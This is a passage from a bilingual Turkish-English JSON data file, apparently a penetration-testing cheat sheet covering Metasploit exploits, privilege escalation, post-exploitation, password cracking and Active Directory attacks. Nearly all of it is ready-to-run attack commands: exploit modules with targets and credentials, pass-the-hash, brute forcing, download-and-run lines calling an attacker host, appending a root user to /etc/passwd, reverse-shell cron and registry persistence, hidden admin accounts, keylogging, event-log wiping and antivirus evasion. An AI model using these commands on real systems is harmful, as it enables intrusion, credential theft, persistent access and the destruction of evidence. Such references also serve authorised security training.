(winrm_script_exec)", "tr": "Windows Uzaktan Yönetim (WinRM - Port 5985/5986) servisi üzerinden geçerli kimliklerle kod çalıştırma.", "en": "Code execution via Windows Remote Management (WinRM - Port 5985/5986) service using valid credentials.", "syntax": "use exploit/windows/winrm/winrm_script_exec", "ex": [{ "c": "use exploit/windows/winrm/winrm_script_exec\nset RHOSTS 192.168.1.10\nset USERNAME admin\nset PASSWORD 1234\nset FORCE_VBS true\nexploit", "tr": "Geçerli WinRM şifresiyle sisteme VBS scripti yükleyerek meterpreter shell al.", "en": "Get a meterpreter shell by uploading a VBS script to the system using valid WinRM credentials." }] }, { "name": "Tomcat JSP Upload Bypass", "tr": "Apache Tomcat sunucularına PUT HTTP metodu ile JSP uzantılı zararlı dosya yükleyip shell alma.", "en": "Getting a shell by uploading a malicious JSP file to Apache Tomcat servers via HTTP PUT method.", "syntax": "use exploit/multi/http/tomcat_jsp_upload_bypass", "ex": [{ "c": "use exploit/multi/http/tomcat_jsp_upload_bypass\nset RHOSTS 192.168.1.10\nset RPORT 8080\nexploit", "tr": "Yazma izinleri hatalı yapılandırılmış (Read-Only kapalı) Tomcat sunucusuna payload yükle.", "en": "Upload payload to a misconfigured Tomcat server with improper write permissions (Read-Only disabled)." }] }, { "name": "vsftpd 2.3.4 Backdoor Açığı", "tr": "Meşhur bir FTP sunucu sürümüne (vsftpd 2.3.4) bilerek yerleştirilmiş gizli arka kapı (gülen yüz ':)') açığı.", "en": "A famous hidden backdoor intentionally placed in an FTP server version (vsftpd 2.3.4) triggered by a smiley face ':)'", "syntax": "use exploit/unix/ftp/vsftpd_234_backdoor", "ex": [{ "c": "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 192.168.1.10\nexploit", "tr": "Gülen yüz içeren bir kullanıcı adıyla giriş yapmaya çalışarak arka kapıyı tetikler ve root shell alınır.", "en": "Trigger the backdoor by attempting to log in with a username containing a smiley face to get root shell." }] }, { "name": "PsExec ile Pass The Hash (Güncelleme)", "tr": "Kullanıcının şifresini bilmeden, sadece NTLM hash değerini kullanarak SMB üzerinden oturum açıp shell alma.", "en": "Logging in over SMB and getting a shell using only the NTLM hash value, without knowing the user's password.", "syntax": "set SMBPass [LM_Hash]:[NTLM_Hash]", "ex": [{ "c": "use exploit/windows/smb/psexec\nset SMBUser Administrator\nset SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nexploit", "tr": "Administrator kullanıcısının (Mimikatz vb. ile) ele geçirilen Hash'ini SMBPass olarak ayarla ve bağlan.", "en": "Set the captured Hash of the Administrator user (via Mimikatz etc.) as SMBPass and connect." }] }, { "name": "SSH Brute-Force (ssh_login)", "tr": "SSH servisine yönelik kaba kuvvet (Brute-Force) sözlük saldırısı yaparak geçerli kimlik bilgilerini bulma modülü.", "en": "Module for conducting Brute-Force dictionary attacks against the SSH service to find valid credentials.", "syntax": "use auxiliary/scanner/ssh/ssh_login", "ex": [{ "c": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS 192.168.1.10\nset USER_FILE users.txt\nset PASS_FILE passwords.txt\nrun", "tr": "Belirtilen kullanıcı adı ve şifre listelerini kullanarak hedefin SSH servisine otomatik giriş denemeleri yap.", "en": "Automatically attempt logins to the target's SSH service using specified username and password lists." }] }] }, { "cat": "privilegeEscalation", "cmds": [{ "name": "linpeas", "tr": "Linux sistemlerde yetki yükseltme (PrivEsc) açıklarını arayan otomatize script.", "en": "Automated script that searches for privilege escalation paths on Linux.", "syntax": "./linpeas.sh", "ex": [{ "c": "wget http://attacker_ip/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh", "tr": "Hedefte indir ve çalıştır", "en": "Download and run on target" }] }, { "name": "pspy", "tr": "Linux süreçlerini root yetkisi olmadan gerçek zamanlı izler (Cron job tespiti vb.).", "en": "Snoop on Linux processes in real-time without root privileges.", "syntax": "./pspy[32|64]", "ex": [{ "c": "./pspy64", "tr": "Süreç izleyiciyi çalıştır", "en": "Run process snooper" }] }, { "name": "GTFOBins", "tr": "Yanlış yapılandırılmış meşru binary'leri (SUID, sudo vb.) kullanarak yetki yükseltme rehberi.", "en": "Privilege escalation guide using misconfigured legitimate binaries.", "syntax": "Konsept / Araç", "ex": [{ "c": "sudo find . -exec /bin/sh \\; -quit", "tr": "Sudo yetkili 'find' komutu ile root shell al", "en": "Get root shell using sudo 'find'" }, { "c": "python -c 'import pty; pty.spawn(\"/bin/bash\")'", "tr": "Kısıtlı shell'den interaktif (TTY) shell'e geçiş (Önemli PrivEsc adımı)", "en": "Spawn interactive TTY shell from restricted shell" }] }, { "name": "Windows Exploit Suggester", "tr": "Hedef makinenin 'systeminfo' çıktısını analiz edip, yama yapılmamış olası Privilege Escalation açıklarını öneren araç.", "en": "Tool that analyzes 'systeminfo' output to suggest potential unpatched Privilege Escalation exploits.", "syntax": "python windows-exploit-suggester.py --database [db] --systeminfo [info.txt]", "ex": [{ "c": "python windows-exploit-suggester.py --database 2021-10-10-mssb.xls --systeminfo sysinfo.txt", "tr": "Kurbandan alınan sysinfo.txt dosyasını analiz et ve muhtemel Kernel açıklarını listele.", "en": "Analyze sysinfo.txt from victim and list probable Kernel exploits." }] }, { "name": "Windows Kernel Exploits", "tr": "Github üzerinde derlenmiş (precompiled) veya kaynak kodu olan Windows kernel yetki yükseltme açıkları deposu.", "en": "Repository of precompiled or source Windows kernel privilege escalation exploits on Github.", "syntax": "Github Repo (SecWiki)", "ex": [{ "c": "git clone https://github.com/SecWiki/windows-kernel-exploits.git", "tr": "Önerilen exploit'i (örn: MS15-051) bu depodan bulup hedefe yükle ve çalıştır.", "en": "Find suggested exploit (e.g. MS15-051) from this repo, upload to target and execute." }] }, { "name": "UACME ile UAC'yi Atlatma", "tr": "Windows Kullanıcı Hesabı Denetimi (UAC) pencerelerini sessizce atlatarak yönetici (High Integrity) yetkisi almak.", "en": "Bypassing Windows User Account Control (UAC) prompts silently to get High Integrity admin shell.", "syntax": "akagi32.exe / akagi64.exe [Yöntem_ID] [Zararlı_Dosya]", "ex": [{ "c": "akagi64.exe 23 c:\\temp\\payload.exe", "tr": "UACME aracı ile 23 numaralı yöntemi (pkgmgr.exe) kullanarak payload'ı sessizce yönetici olarak çalıştır.", "en": "Use UACME with method #23 (pkgmgr.exe) to silently execute payload as admin." }] }, { "name": "Zayıf Yetkilendirmeler (Weak Permissions)", "tr": "Linux sistemlerde yanlışlıkla okuma/yazma izni verilmiş kritik dosyaları (örn: /etc/shadow, /etc/passwd) sömürerek yetki yükseltme.", "en": "Privilege escalation by exploiting critical files (e.g., /etc/shadow, /etc/passwd) accidentally given read/write permissions on Linux.", "syntax": "ls -l /etc/passwd /etc/shadow", "ex": [{ "c": "ls -l /etc/shadow", "tr": "Eğer shadow dosyasında okuma (read) izni varsa, içindeki şifreli hashleri çalıp kendi bilgisayarında kırabilirsin.", "en": "If shadow file has read permission, you can steal the hashed passwords and crack them on your machine." }, { "c": "echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd", "tr": "Eğer passwd dosyasında yazma (write) izni varsa, kendini 0 id'li (root yetkili) yeni bir kullanıcı olarak sisteme ekle.", "en": "If passwd file has write permission, append yourself as a new user with id 0 (root privileges)." }] }, { "name": "Sudo Privileges (Sudo Yetkileri)", "tr": "Şifre sormadan (NOPASSWD) sudo ile çalıştırılabilen programları kullanarak root shell alma taktikleri (GTFOBins referansı).", "en": "Tactics for getting a root shell using programs that can be run with sudo without a password (NOPASSWD) (GTFOBins reference).", "syntax": "sudo -l", "ex": [{ "c": "sudo -l", "tr": "Önce hangi komutları root olarak parolasız çalıştırabildiğini kontrol et.", "en": "First, check which commands you can run as root without a password." }, { "c": "sudo find . -exec /bin/sh \\; -quit", "tr": "Eğer 'find' komutunu sudo ile kullanabiliyorsan, find üzerinden root yetkisinde terminal (shell) aç.", "en": "If you can use 'find' with sudo, spawn a root shell through find." }] }, { "name": "Windows Yetki Yükseltme Yolları", "tr": "Windows sistemlerde yaygın olarak karşılaşılan yerel zafiyetler (Unquoted Service Path, AlwaysInstallElevated vb.).", "en": "Common local vulnerabilities found on Windows systems (Unquoted Service Path, AlwaysInstallElevated, etc.).", "syntax": "wmic / reg query", "ex": [{ "c": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\"", "tr": "Unquoted Service Path: Tırnak içine alınmamış ve boşluk içeren servis yollarını bul (Araya zararlı exe sıkıştırmak için).", "en": "Unquoted Service Path: Find unquoted service paths with spaces (to inject malicious exe in between)." }, { "c": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "tr": "AlwaysInstallElevated: Eğer bu değer 1 ise, herhangi bir normal kullanıcı zararlı bir .msi paketini 'SYSTEM' yetkisiyle kurabilir.", "en": "AlwaysInstallElevated: If this value is 1, any normal user can install a malicious .msi package with 'SYSTEM' privileges." }] }] }, { "cat": "postExploitation", "cmds": [{ "name": "Shell'i Meterpreter'a Yükseltme", "tr": "Standart ve kısıtlı bir komut satırını (shell), Metasploit'in çok yetenekli Meterpreter shell'ine dönüştürme.", "en": "Upgrading a standard command shell to a highly capable Meterpreter shell.", "syntax": "sessions -u [session_id]", "ex": [{ "c": "sessions -u 1", "tr": "Arka plandaki 1 numaralı standart shell'i meterpreter'a yükseltir.", "en": "Upgrades standard shell session 1 in the background to a meterpreter session." }, { "c": "use post/multi/manage/shell_to_meterpreter\nset SESSION 1\nrun", "tr": "Aynı işlemi yapan alternatif yükseltme modülü.", "en": "Alternative upgrade module performing the same action." }] }, { "name": "Windows'ta Kalıcılık Oluşturma (Persistence)", "tr": "Hedef bilgisayar yeniden başlatılsa bile saldırganın yetkili bağlantısının devam etmesini sağlama.", "en": "Ensuring the attacker's privileged connection persists even if the target machine reboots.", "syntax": "run persistence [secenekler]", "ex": [{ "c": "run persistence -X -i 5 -p 4444 -r [Kendi_IP]", "tr": "-X ile sistemi açılışında çalışacak kayıt defteri (Registry) anahtarı ekle ve her 5 saniyede bir bağlanmaya çalış.", "en": "Add Registry key to run at boot (-X) and attempt to connect every 5 seconds." }] }, { "name": "RDP Etkinleştirme (getgui)", "tr": "Meterpreter üzerinden hedefteki Uzak Masaüstü (RDP) servisini gizlice açma.", "en": "Silently enabling Remote Desktop (RDP) service on the target via Meterpreter.", "syntax": "run getgui -e", "ex": [{ "c": "run getgui -e", "tr": "RDP'yi aktif et ve Windows güvenlik duvarında 3389 portuna otomatik izin ver.", "en": "Enable RDP and automatically allow port 3389 in Windows firewall." }, { "c": "run getgui -u hacker -p 123456", "tr": "RDP erişimi için 'hacker' adında yeni bir gizli yönetici hesabı oluşturur.", "en": "Creates a new hidden admin account 'hacker' for RDP access." }] }, { "name": "Windows Keylogging", "tr": "Kurbanın klavyede bastığı tüm tuşları (şifreler, mesajlar) kaydetme ve okuma.", "en": "Recording and reading all keystrokes (passwords, messages) typed by the victim.", "syntax": "keyscan_start / keyscan_dump", "ex": [{ "c": "keyscan_start", "tr": "Klavye dinlemeyi arka planda başlat (İşlemi gizlemek için önce explorer.exe içine 'migrate' olmak gerekir).", "en": "Start keylogging in the background (Must 'migrate' to explorer.exe first to hide)." }, { "c": "keyscan_dump", "tr": "O ana kadar yazılan tüm tuş vuruşlarını ekrana basar.", "en": "Dumps all recorded keystrokes up to that moment to the screen." }] }, { "name": "Olay Günlüklerini Temizleme (Clearev)", "tr": "Sistemdeki tüm izleri kaybettirmek için Windows Olay Görüntüleyicisi (Event Viewer) kayıtlarını silme.", "en": "Clearing Windows Event Viewer logs to cover all tracks in the system.", "syntax": "clearev", "ex": [{ "c": "clearev", "tr": "Meterpreter üzerinden Application, System ve Security (Uygulama, Sistem, Güvenlik) loglarını tek tuşla siler.", "en": "Clears Application, System, and Security logs with one command via Meterpreter." }] }, { "name": "Sistem Numaralandırma (enum_system)", "tr": "Meterpreter oturumu açıldıktan sonra hedef sistemin (Linux/Windows) donanım, ağ ve işletim sistemi özetini çıkarır.", "en": "Extracts hardware, network, and OS summary of the target system (Linux/Windows) after a Meterpreter session is established.", "syntax": "run post/[platform]/gather/enum_system", "ex": [{ "c": "run post/linux/gather/enum_system", "tr": "Linux hedefinden detaylı sistem bilgilerini (Kernel, Dağıtım vb.) otomatik topla.", "en": "Automatically gather detailed system info (Kernel, Distro, etc.) from Linux target." }, { "c": "run post/windows/gather/enum_system", "tr": "Windows hedefinden ortam değişkenleri, kurulu güncellemeler ve sistem detaylarını topla.", "en": "Gather environment variables, installed updates, and system details from Windows target." }] }, { "name": "Koruma Analizi (enum_protections)", "tr": "Hedefte aktif olan güvenlik mekanizmalarını (ASLR, SMEP, SELinux, AppArmor) tespit eder.", "en": "Detects active security mechanisms on the target (ASLR, SMEP, SELinux, AppArmor).", "syntax": "run post/linux/gather/enum_protections", "ex": [{ "c": "run post/linux/gather/enum_protections", "tr": "Linux üzerinde hangi çekirdek (kernel) korumalarının aktif olduğunu görerek exploit seçimini kolaylaştır.", "en": "Check which kernel protections are active on Linux to facilitate exploit selection." }] }, { "name": "Yapılandırma Analizi (enum_configs)", "tr": "Hedef sistemdeki kritik konfigürasyon dosyalarını (örn: sshd_config, apache2.conf) bulup çeker.", "en": "Finds and downloads critical configuration files on the target system (e.g., sshd_config, apache2.conf).", "syntax": "run post/linux/gather/enum_configs", "ex": [{ "c": "run post/linux/gather/enum_configs", "tr": "Linux hedefindeki tüm servis ayar dosyalarını toplayarak olası zafiyetleri incele.", "en": "Gather all service config files on Linux target to investigate potential vulnerabilities." }] }, { "name": "Kullanıcı Geçmişi (enum_users_history)", "tr": "Sistemdeki tüm kullanıcıların komut geçmişini (.bash_history) okuyarak unutulmuş şifreleri arar.", "en": "Reads the command history (.bash_history) of all users on the system to look for forgotten passwords.", "syntax": "run post/linux/gather/enum_users_history", "ex": [{ "c": "run post/linux/gather/enum_users_history", "tr": "Adminlerin terminalde yanlışlıkla düz metin (plaintext) olarak yazdığı şifreleri bul.", "en": "Find passwords accidentally typed in plaintext by admins in the terminal." }] }, { "name": "Sanal Makine Kontrolü (checkvm)", "tr": "Ele geçirilen sistemin gerçek bir fiziksel makine mi yoksa sanal makine (VMware, VirtualBox) mi olduğunu anlar.", "en": "Determines if the compromised system is a real physical machine or a virtual machine (VMware, VirtualBox).", "syntax": "run post/[platform]/gather/checkvm", "ex": [{ "c": "run post/linux/gather/checkvm", "tr": "Linux makinenin sanallaştırma kullanıp kullanmadığını (Honeypot analizi için) tespit et.", "en": "Detect if the Linux machine uses virtualization (useful for Honeypot analysis)." }] }, { "name": "Named Pipe Numaralandırması (is_known_pipename)", "tr": "Windows ağlarındaki adlandırılmış veri yollarını (Named Pipes) analiz ederek SMB servis zafiyetlerini kontrol eder.", "en": "Analyzes Named Pipes in Windows networks to check for SMB service vulnerabilities.", "syntax": "use auxiliary/scanner/smb/pipe_auditor", "ex": [{ "c": "use auxiliary/scanner/smb/pipe_auditor\nset RHOSTS 192.168.1.10\nrun", "tr": "Hedefteki bilinen Named Pipe'ları (browser, spoolss vb.) listeleyerek yanal hareket (lateral movement) yollarını bul.", "en": "List known Named Pipes (browser, spoolss, etc.) on the target to find lateral movement paths." }] }, { "name": "Shellter ile AV Atlatma (Evasion)", "tr": "Zararlı yazılımları (payload), yasal ve temiz uygulamaların (örn: putty.exe) içine polimorfik olarak gizleyerek Antivirüsleri (AV) atlatma aracı.", "en": "Tool for evading Antiviruses by polymorphically hiding malware (payload) inside legitimate applications.", "syntax": "shellter", "ex": [{ "c": "shellter", "tr": "Shellter arayüzünü başlat, 'Auto' modunu seçip temiz bir PE (.exe) dosyasına payload enjekte et.", "en": "Start Shellter interface, select 'Auto' mode and inject payload into a clean PE (.exe) file." }] }, { "name": "PowerShell Kod Gizleme (Obfuscation)", "tr": "Zararlı PowerShell betiklerinin güvenlik yazılımlarına (AMSI) yakalanmaması için kodlarını karmaşıklaştırma.", "en": "Obfuscating malicious PowerShell scripts to avoid detection by security software (AMSI).", "syntax": "Invoke-Obfuscation", "ex": [{ "c": "Import-Module ./Invoke-Obfuscation.psd1\nInvoke-Obfuscation", "tr": "Araç çalıştırıldıktan sonra, script yolunu verip 'ENCODING' gibi metotlarla zararlı kodu okunamaz (gizli) hale getir.", "en": "After running the tool, provide script path and obfuscate code using methods like 'ENCODING'." }] }, { "name": "Windows: Yerel Numaralandırma (Local Enum)", "tr": "Windows hedefine sızdıktan sonra yetki yükseltmek için; kullanıcı, ağ, süreç ve hizmet bilgilerini manuel olarak toplama.", "en": "Manually gathering user, network, process, and service info after breaching a Windows target to escalate privileges.", "syntax": "cmd komutları", "ex": [{ "c": "net users && net localgroup administrators", "tr": "Kullanıcı/Grup Numaralandırması: Sistemdeki tüm kullanıcıları ve admin grubundaki üyeleri listele.", "en": "User/Group Enum: List all users on the system and members of the admin group." }, { "c": "ipconfig /all && arp -a && route print", "tr": "Ağ Numaralandırması: Ağ yapılandırmasını, ARP tablosunu ve yönlendirme (routing) kurallarını görüntüle.", "en": "Network Enum: View network configuration, ARP table, and routing rules." }, { "c": "tasklist /SVC && schtasks /query /fo LIST /v", "tr": "Süreç/Hizmet Numaralandırması: Çalışan tüm süreçleri, hizmetleri ve zamanlanmış görevleri (Scheduled Tasks) listele.", "en": "Process/Service Enum: List all running processes, services, and scheduled tasks." }] }, { "name": "Linux: Yerel Numaralandırma (Local Enum)", "tr": "Linux hedefine sızdıktan sonra yetki yükseltmek için; kullanıcı, ağ, süreç ve zamanlanmış görev bilgilerini manuel toplama.", "en": "Manually gathering user, network, process, and cron job info after breaching a Linux target to escalate privileges.", "syntax": "bash komutları", "ex": [{ "c": "cat /etc/passwd | grep sh$", "tr": "Kullanıcı/Grup Numaralandırması: Sistemde geçerli bir terminale (shell) sahip olan gerçek kullanıcıları listele.", "en": "User/Group Enum: List real users with a valid shell on the system." }, { "c": "ifconfig -a && arp -a && netstat -antp", "tr": "Ağ Numaralandırması: Ağ arayüzlerini, ARP önbelleğini ve aktif ağ bağlantılarını/portları listele.", "en": "Network Enum: List network interfaces, ARP cache, and active network connections/ports." }, { "c": "ps aux && cat /etc/crontab && ls -la /etc/cron.*", "tr": "Süreç/Hizmet Numaralandırması: Çalışan süreçleri ve sistem genelindeki zamanlanmış görevleri (Cron Jobs) kontrol et.", "en": "Process/Service Enum: Check running processes and system-wide scheduled tasks (Cron Jobs)." }] }, { "name": "Otomatik Yerel Numaralandırma (Enum Scripts)", "tr": "Sisteme sızdıktan sonra tüm yetki yükseltme açıklarını otomatik olarak tarayan popüler scriptlerin (winPEAS/linPEAS) kullanımı.", "en": "Using popular scripts (winPEAS/linPEAS) that automatically scan for all privilege escalation vulnerabilities after breaching a system.", "syntax": "winPEAS.exe / linpeas.sh", "ex": [{ "c": "winPEASany.exe quiet cmd fast", "tr": "Windows hedefinde winPEAS aracını hızlı ve detayları gizleyerek (sadece önemli olanları göstererek) çalıştır.", "en": "Run winPEAS on Windows target fast and hiding details (only showing important findings)." }, { "c": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "tr": "Linux hedefinde linPEAS aracını internetten doğrudan belleğe indir ve çalıştır.", "en": "Download linPEAS from the internet directly to memory on Linux target and execute." }] }, { "name": "Dosyaları Hedefe Aktarma (File Transfer)", "tr": "Saldırganın makinesindeki araçları (exploit, PEAS scripti) kurban makineye (Linux/Windows) indirme (transfer) teknikleri.", "en": "Techniques to download tools (exploits, PEAS scripts) from attacker's machine to victim machine (Linux/Windows).", "syntax": "http.server / wget / certutil", "ex": [{ "c": "python3 -m http.server 80", "tr": "[Saldırgan Makinesi] Bulunduğunuz dizindeki dosyaları paylaşmak için basit bir web sunucusu başlatın.", "en": "[Attacker Machine] Start a simple web server to share files in the current directory." }, { "c": "certutil -urlcache -f -split http://10.0.0.1/winpeas.exe winpeas.exe", "tr": "[Windows Hedef] certutil kullanarak komut satırından HTTP üzerinden dosya indir.", "en": "[Windows Target] Download file over HTTP from command line using certutil." }, { "c": "Invoke-WebRequest -Uri http://10.0.0.1/winpeas.exe -OutFile winpeas.exe", "tr": "[Windows Hedef] PowerShell (wget alternatifi) kullanarak dosya indir.", "en": "[Windows Target] Download file using PowerShell (wget alternative)." }, { "c": "wget http://10.0.0.1/linpeas.sh -O linpeas.sh", "tr": "[Linux Hedef] wget aracı ile komut satırından dosya indir.", "en": "[Linux Target] Download file from command line using wget." }] }, { "name": "Etkileşimli Olmayan Shell'i Yükseltme (Upgrade to Interactive TTY)", "tr": "Netcat ile alınan basit shell'leri tam etkileşimli, sekme tamamlama (tab) çalışan ve CTRL+C yapınca kapanmayan Bash terminaline dönüştürme.", "en": "Converting simple Netcat shells into fully interactive Bash terminals with tab completion where CTRL+C doesn't kill the session.", "syntax": "python -c 'import pty...'", "ex": [{ "c": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "tr": "1. Adım: Netcat shell'i aldıktan sonra Python ile sahte terminal (PTY) başlat.", "en": "Step 1: Start pseudo-terminal (PTY) with Python after getting Netcat shell." }, { "c": "CTRL+Z\nstty raw -echo; fg\nexport TERM=xterm", "tr": "2. Adım: Shell'i arka plana at, stty ayarlarını değiştirip geri getir ve TERM değişkenini ayarla (Artık CTRL+C güvenli).", "en": "Step 2: Background shell, change stty settings, bring back to foreground and set TERM variable (CTRL+C is now safe)." }] }, { "name": "SSH Key (Anahtar) ile Kalıcılık (Linux)", "tr": "Hedef Linux sunucuda ~/.ssh/authorized_keys dosyasına kendi açık anahtarını (public key) ekleyerek parolasız kalıcılık sağlama.", "en": "Ensuring passwordless persistence by adding your public key to the ~/.ssh/authorized_keys file on the target Linux server.", "syntax": "ssh-keygen / echo id_rsa.pub >> authorized_keys", "ex": [{ "c": "ssh-keygen -t rsa -b 4096", "tr": "Saldırgan kendi makinesinde yeni bir RSA SSH anahtar çifti oluşturur.", "en": "Attacker generates a new RSA SSH key pair on their own machine." }, { "c": "echo 'ssh-rsa AAAAB3N...' >> /root/.ssh/authorized_keys", "tr": "Kurban makinede (root olunduysa) public key authorized_keys dosyasına eklenir. Artık dışarıdan şifresiz 'ssh root@IP' yapılabilir.", "en": "On victim machine (if root), append public key to authorized_keys. You can now login passwordless via 'ssh root@IP'." }] }, { "name": "Cron Jobs (Zamanlanmış Görev) ile Kalıcılık", "tr": "Linux sistemlerde belirli aralıklarla zararlı bir betiği otomatik çalıştırarak (Cron) bağlantı sürekliliğini sağlama.", "en": "Ensuring connection persistence by automatically running a malicious script at regular intervals (Cron) on Linux systems.", "syntax": "crontab -e", "ex": [{ "c": "echo '* * * * * root /tmp/reverse_shell.sh' >> /etc/crontab", "tr": "Sistem genelindeki crontab'a ekleme yap: Her dakika root yetkisiyle ters bağlantı (reverse shell) betiğini çalıştır.", "en": "Add to system-wide crontab: Run reverse shell script as root every minute." }] }, { "name": "Windows'ta Sürekliliği Sağlamak (Registry Kalıcılığı)", "tr": "Windows kayıt defterindeki (Registry) başlangıç anahtarlarına zararlı yazılımı (payload) ekleyerek cihaz her açıldığında bağlantı alma.", "en": "Adding malware (payload) to Windows Registry startup keys to get a connection every time the device boots.", "syntax": "reg add", "ex": [{ "c": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Guncelleme\" /t REG_SZ /d \"C:\\temp\\shell.exe\" /f", "tr": "Kullanıcı her oturum açtığında C:\\temp altındaki shell.exe'yi otomatik çalıştıracak gizli bir 'Run' kaydı oluştur.", "en": "Create a hidden 'Run' record that auto-starts shell.exe under C:\\temp every time the user logs in." }] }, { "name": "RDP Yoluyla Kalıcılık", "tr": "Uzak Masaüstü Bağlantısı'nı (RDP) etkinleştirerek (daha önce eklenen getgui komutuna ek olarak) ve kullanıcıları RDP grubuna ekleyerek GUI erişimini koruma.", "en": "Maintaining GUI access by enabling Remote Desktop Connection (RDP) and adding users to the RDP group.", "syntax": "net localgroup", "ex": [{ "c": "net user hacker Password123 /add && net localgroup Administrators hacker /add", "tr": "Yeni bir 'hacker' kullanıcısı oluştur ve onu Yöneticiler (Administrators) grubuna ekle.", "en": "Create a new 'hacker' user and add them to the Administrators group." }, { "c": "net localgroup \"Remote Desktop Users\" hacker /add", "tr": "Kullanıcıyı RDP yapabilmesi için 'Uzak Masaüstü Kullanıcıları' grubuna dahil et.", "en": "Add the user to the 'Remote Desktop Users' group so they can use RDP." }] }, { "name": "Pivoting (Sıçrama / Tünelleme Saldırısı)", "tr": "Ele geçirilen bir makineyi köprü (proxy) olarak kullanarak, dışarıdan erişilemeyen iç ağdaki (Internal Network) diğer makinelere sıçrama.", "en": "Using a compromised machine as a bridge (proxy) to jump to other machines on the internal network that are inaccessible from the outside.", "syntax": "ssh -D / meterpreter autoroute / proxychains", "ex": [{ "c": "ssh -D 9050 user@10.0.0.1", "tr": "SSH Dinamik Port Yönlendirme (Dynamic Port Forwarding): Kurban makine üzerinden 9050 portunda bir SOCKS proxy açar.", "en": "SSH Dynamic Port Forwarding: Opens a SOCKS proxy on port 9050 through the victim machine." }, { "c": "proxychains nmap -sT -p 80 192.168.2.10", "tr": "Açılan SSH proxy tünelini kullanarak (Proxychains), normalde göremediğin gizli iç ağdaki (192.168.2.x) makineye Nmap taraması yap.", "en": "Use the opened SSH proxy tunnel (Proxychains) to scan a machine on the hidden internal network (192.168.2.x) that you normally can't see." }, { "c": "run autoroute -s 192.168.2.0/24", "tr": "Meterpreter üzerinden: Ele geçirilen makinenin bulunduğu diğer iç ağı (192.168.2.x) Metasploit yönlendirme tablona ekle.", "en": "Via Meterpreter: Add the other internal network (192.168.2.x) where the compromised machine is located to your Metasploit routing table." }] }] }, { "cat": "passwordCracking", "cmds": [{ "name": "hash-identifier", "tr": "Bilinmeyen bir hash'in algoritma türünü tahmin eder.", "en": "Predicts the algorithm type of an unknown hash.", "syntax": "hash-identifier", "ex": [{ "c": "hash-identifier", "tr": "Aracı başlat ve hash'i yapıştır", "en": "Start tool and paste hash" }] }, { "name": "hashcat", "tr": "GPU tabanlı, dünyanın en hızlı parola kırma aracı.", "en": "World's fastest, GPU-based password recovery utility.", "syntax": "hashcat [options]... hashfile [dictionary]", "ex": [{ "c": "hashcat -m 1000 -a 0 hash.txt rockyou.txt", "tr": "NTLM hash'ine sözlük (wordlist) saldırısı", "en": "Dictionary attack on NTLM hash" }] }, { "name": "john", "tr": "John the Ripper - Çok yönlü ve CPU tabanlı parola kırıcı.", "en": "John the Ripper - Versatile CPU-based password cracker.", "syntax": "john [options] [hashfile]", "ex": [{ "c": "john --wordlist=rockyou.txt hash.txt", "tr": "Sözlük saldırısı başlat", "en": "Start dictionary attack" }, { "c": "john --show hash.txt", "tr": "Kırılan parolaları listele", "en": "List cracked passwords" }] }, { "name": "hydra", "tr": "Ağ servisleri için paralel login brute-force aracı (Credential Stuffing / Brute Force).", "en": "Parallelized login brute-force cracker for network services.", "syntax": "hydra [options] target service", "ex": [{ "c": "hydra -l admin -P rockyou.txt ssh://192.168.1.10 -t 4", "tr": "SSH servisine kaba kuvvet saldırısı (4 threads)", "en": "Brute-force SSH service (4 threads)" }] }, { "name": "fcrackzip", "tr": "ZIP arşivleri için parola kırma aracı.", "en": "Password cracker for ZIP archives.", "syntax": "fcrackzip [options] file.zip", "ex": [{ "c": "fcrackzip -v -D -u -p rockyou.txt dosya.zip", "tr": "ZIP dosyasına sözlük saldırısı (-u ile doğrula)", "en": "Dictionary attack on ZIP (verify with -u)" }] }, { "name": "Linux /etc/shadow Hash Türleri", "tr": "Linux parola özetlerinde kullanılan algoritmalar id numarasına ( $id$ ) göre anlaşılır.", "en": "Algorithms used in Linux password hashes are identified by their id number ( $id$ ).", "syntax": "$id$salt$hash", "ex": [{ "c": "$1$ -> MD5\n$2a$ / $2y$ -> Blowfish (Bcrypt)\n$5$ -> SHA-256\n$6$ -> SHA-512 (Modern Linux)", "tr": "Linux Hash algoritması formatları ve ID numaraları.", "en": "Linux Hash algorithm formats and ID numbers." }, { "c": "hashcat -m 1800 hash.txt rockyou.txt", "tr": "Linux $6$ (SHA-512) formatındaki hash'i Hashcat ile kır (-m 1800).", "en": "Crack Linux $6$ (SHA-512) hash with Hashcat (-m 1800)." }] }, { "name": "NTLM Hash'lerini Yığınlama ve Kırma (Dumping & Cracking)", "tr": "Windows hedefinden (SAM dosyasından veya LSASS'den) NTLM hashlerini çıkarıp Hashcat/John ile çevrimdışı kırma.", "en": "Dumping NTLM hashes from Windows target (SAM file or LSASS) and cracking them offline with Hashcat/John.", "syntax": "secretsdump.py / hashcat", "ex": [{ "c": "impacket-secretsdump yetkili_kullanici:sifre@192.168.1.10", "tr": "Impacket kullanarak hedefteki SAM veritabanındaki tüm NTLM hash'lerini uzaktan çek (Dumping).", "en": "Remotely dump all NTLM hashes from the SAM database on the target using Impacket." }, { "c": "hashcat -m 1000 hashes.txt rockyou.txt", "tr": "Elde edilen Windows NTLM hash'lerini (Format 1000) rockyou kelime listesiyle kırmaya çalış.", "en": "Attempt to crack the obtained Windows NTLM hashes (Format 1000) using the rockyou wordlist." }] }] }, { "cat": "adInitialAccess", "cmds": [{ "name": "LLMNR / NBT-NS Poisoning (Konsept)", "tr": "LLMNR, DNS'in çözümleyemediği isimleri ağa multicast soran Windows protokolüdür. Saldırgan (Responder) sahte yanıt dönerek NTLMv2 hash'lerini yakalar.", "en": "LLMNR is a Windows protocol that multicasts name queries when DNS fails. An attacker (Responder) sends fake replies to capture NTLMv2 hashes.", "syntax": "Saldırı Vektörü", "ex": [{ "c": "1. Hatalı İstek (\\palsayim)\n2. DNS Başarısızlığı\n3. LLMNR Yayını (Multicast)\n4. Sahte Yanıt (Poisoning)\n5. NTLMv2 Hash Yakalama", "tr": 